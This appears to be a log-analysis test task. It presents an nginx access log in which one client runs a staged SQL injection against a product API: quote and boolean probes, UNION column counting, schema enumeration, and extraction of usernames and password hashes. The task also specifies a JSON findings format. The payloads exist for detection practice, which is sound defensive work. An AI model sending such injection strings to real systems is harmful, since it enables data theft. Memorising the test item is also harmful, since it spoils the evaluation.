# Security Review Task: Web Access Log Analysis

You are a security analyst investigating an e-commerce application. Below is an
excerpt from the nginx access log. Analyze the log and determine whether it
shows evidence of an attack. If so, identify the type of attack, the location in
the log (the attacker source and/or the relevant requests), and the evidence.

```text
198.51.100.7 - - [03/Sep/2026:19:43:41 +0000] "GET /api/products?id=7 HTTP/1.1" 200 511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
192.0.2.55 - - [03/Sep/2026:19:44:07 +0000] "GET /api/products?id=1 HTTP/1.1" 200 512 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:08 +0000] "GET /api/products?id=1%27 HTTP/1.1" 500 217 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:09 +0000] "GET /api/products?id=1%20AND%201=1 HTTP/1.1" 200 512 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:10 +0000] "GET /api/products?id=1%20AND%201=2 HTTP/1.1" 200 31 "-" "python-requests/2.31.0"
10.0.2.15 - - [03/Sep/2026:19:44:10 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.29"
192.0.2.55 - - [03/Sep/2026:19:44:12 +0000] "GET /api/products?id=1%20UNION%20SELECT%20NULL HTTP/1.1" 500 217 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:13 +0000] "GET /api/products?id=1%20UNION%20SELECT%20NULL,NULL HTTP/1.1" 500 217 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:14 +0000] "GET /api/products?id=1%20UNION%20SELECT%20NULL,NULL,NULL HTTP/1.1" 200 540 "-" "python-requests/2.31.0"
198.51.100.7 - - [03/Sep/2026:19:44:15 +0000] "POST /cart/add HTTP/1.1" 302 0 "https://shop.example.com/items/7" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
192.0.2.55 - - [03/Sep/2026:19:44:16 +0000] "GET /api/products?id=1%20UNION%20SELECT%20table_name,NULL,NULL%20FROM%20information_schema.tables HTTP/1.1" 200 8241 "-" "python-requests/2.31.0"
192.0.2.55 - - [03/Sep/2026:19:44:21 +0000] "GET /api/products?id=1%20UNION%20SELECT%20username,password_hash,NULL%20FROM%20users HTTP/1.1" 200 264913 "-" "python-requests/2.31.0"
10.0.2.15 - - [03/Sep/2026:19:44:20 +0000] "GET /healthz HTTP/1.1" 200 2 "-" "kube-probe/1.29"
198.51.100.7 - - [03/Sep/2026:19:44:33 +0000] "GET /orders HTTP/1.1" 200 4187 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
```

## Output contract

After your analysis, output a line containing exactly:

```
--- FINDINGS ---
```

Then output a JSON array. Each element must be an object of the form:

```json
{"type": "...", "location": "...", "evidence": "..."}
```

If you find no security issues, output an empty array `[]`.
